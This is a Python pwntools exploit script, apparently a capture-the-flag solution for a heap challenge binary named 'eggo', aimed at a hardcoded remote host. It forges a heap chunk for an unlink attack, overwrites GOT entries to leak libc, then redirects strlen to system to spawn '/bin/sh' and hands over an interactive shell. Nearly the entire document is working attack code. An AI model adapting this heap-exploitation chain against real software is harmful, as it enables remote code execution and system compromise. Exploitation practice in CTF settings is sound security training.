#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

REMOTE_HOST = '46.101.107.117'
REMOTE_PORT = 2208

context.update(arch='i386')
exe = './eggo'
LIBC_LOCATION = "./libc-2.33.so"

elf = ELF(exe)
libc = ELF(LIBC_LOCATION)

def start(argv=[], *a, **kw):
    # return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    # return process([exe] + argv, *a, **kw)
    return remote(REMOTE_HOST, REMOTE_PORT)

gdbscript = '''
continue
'''.format(**locals())

io = start()

def create_egg():
    io.sendline(b"1")
    io.sendline(str(0x420).encode())
    io.recvline()

def edit(index, data):
    io.sendline(b"4")
    io.sendline(str(index).encode())
    io.sendline(data)
    io.recvline()

def remove(index):
    io.sendline(b"2")
    io.sendline(str(index).encode())
    io.recvline()

def weigh_egg(index):
    io.sendline(b"3")
    io.sendline(str(index).encode())
    
    leak = io.recvline()
    io.recvline()
    
    return leak

# Skip menu stuff
io.recv()

# The fourth entry of the global array (always the same location since PIE is disabled)
ptr = 0x4040f8

with log.progress("Creating chunks (=eggs)"):
    create_egg()
    create_egg()
    create_egg()
    create_egg() # The chunk which will store our fake chunk
    create_egg()

with log.progress("Create fake chunk"):
    fakeChunk = b""
    fakeChunk += p64(0x0)           # Previous Size
    fakeChunk += p64(0x420)         # Size
    fakeChunk += p64(ptr - 0x18)    # Forward Pointer
    fakeChunk += p64(ptr - 0x10)    # Back Pointer
    fakeChunk += p64(0x0) * 128     # Fillter to the next chunk
    
    # Next Chunk which we overflow into
    fakeChunk += p64(0x420)         # Previous Size
    fakeChunk += p64(0x430)         # Size
    
    # Send the data
    edit(3, fakeChunk)

with log.progress("Unlink attack"):
    remove(4)

with log.progress("Overwrite GOT and leak libc adress"):
    edit(3, p64(elf.got["strlen"]) + p64(elf.got["malloc"])) 
    edit(0, p64(elf.sym["puts"]))   # write puts to strlen GOT entry
    leak = weigh_egg(1)             # Calls puts(malloc)
    libc.address = u64(leak[2:-1].ljust(8, b'\x00')) - libc.sym["malloc"]

log.info(f"Libc Base:   {hex(libc.address)}")
log.info(f"Libc System: {hex(libc.sym['system'])}")

with log.progress("Overwrite strlen and get shell"):
    edit(3, p64(elf.got["strlen"]))
    edit(0, p64(libc.sym["system"])) # write system to strlen GOT entry

    edit(1, b"/bin/sh")     # Write bin/sh to entry 1
    io.sendline(b"3")       # Call system("/bin/sh")
    io.sendline(b"1")

io.interactive()

